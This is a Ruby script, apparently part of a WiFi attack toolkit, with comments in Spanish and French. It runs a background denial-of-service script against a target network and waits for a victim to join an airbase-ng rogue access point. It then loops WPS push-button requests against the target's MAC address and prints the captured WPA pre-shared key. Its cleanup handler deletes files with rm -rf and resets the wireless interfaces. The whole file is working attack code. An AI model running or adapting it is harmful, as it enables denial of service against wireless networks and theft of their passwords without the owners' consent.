#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Salida del programo... limpiando los ficheros... reiniciando las tarjetas por defecto... ESPERA !\e[0m"
`killall airbase-ng`
sleep 2
Dir.chdir '/tmp/wifislaxairbase'
sleep 1
File.open("carte.txt").readlines.each do |carte|
   puts carte
$carte = carte.chomp
system "airmon-zc stop #{$carte}mon"
sleep 4
`service stop httpd`
sleep 4
`rm -rf *.txt`
`rm -rf dhcpd.conf`
`rm -rf dhcpd.leases`
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
puts "Limpieza de ficheros terminado... reiniciando las tarjetas por defecto y network-manager..."
`airmon-zc stop wlan5mon`
sleep 4
`killall wpa_supplicant`
`killall sleep`
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ifconfig wlan1 up`
sleep 4
`service start networkmanager`
sleep 5
puts "Bye..."
exit
end
end


class Open
def self.dos
load 'accessdos.rb'
puts "Starting your second wifi-card..."
system "airmon-zc start #{$cartedos}"
sleep 5
Open.activeDos
end

def self.activeDos
puts "Active DoS will start now..."
dos = Thread.new { `bash dos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Open.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente
puts "Esperamos el usario... apoya ctrl+c si quieres salir..."
until File.read('airbase.txt').include?('associated')
sleep 1
end
puts "\e[1;32m[*] Usario conectado.\e[0m"
Dir.chdir '/tmp'
sleep 1
Process.kill 15, File.read('/tmp/terminal.pid').to_i
`killall xterm`
`killall sleep`
sleep 1
Thread.list.each do |thread|   # ces 2 lignes sont a mettre après le loop do qui test le fichier hostapd.psk
  thread.exit unless thread == Thread.current
puts "Iniciando wpa_cli con la segunda tarjeta..."
Dir.chdir '/tmp/wifislaxairbase'
sleep 1
load 'historique.rb'
`airmon-zc stop #{$cartedos}mon`
sleep 4
`rfkill unblock all`
`ifconfig #{$cartedos} up`
sleep 4
       puts "Esperamos por el WPS push boton..."
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/wifislaxairbase/wpa_supplicant.conf /etc/`
sleep 1;
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Open.wpaKey  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
sleep(5000000)
end
end

def self.wpaKey
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] El boton WPS ha sido apoyado, WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |psk|
   puts psk
end
end
end
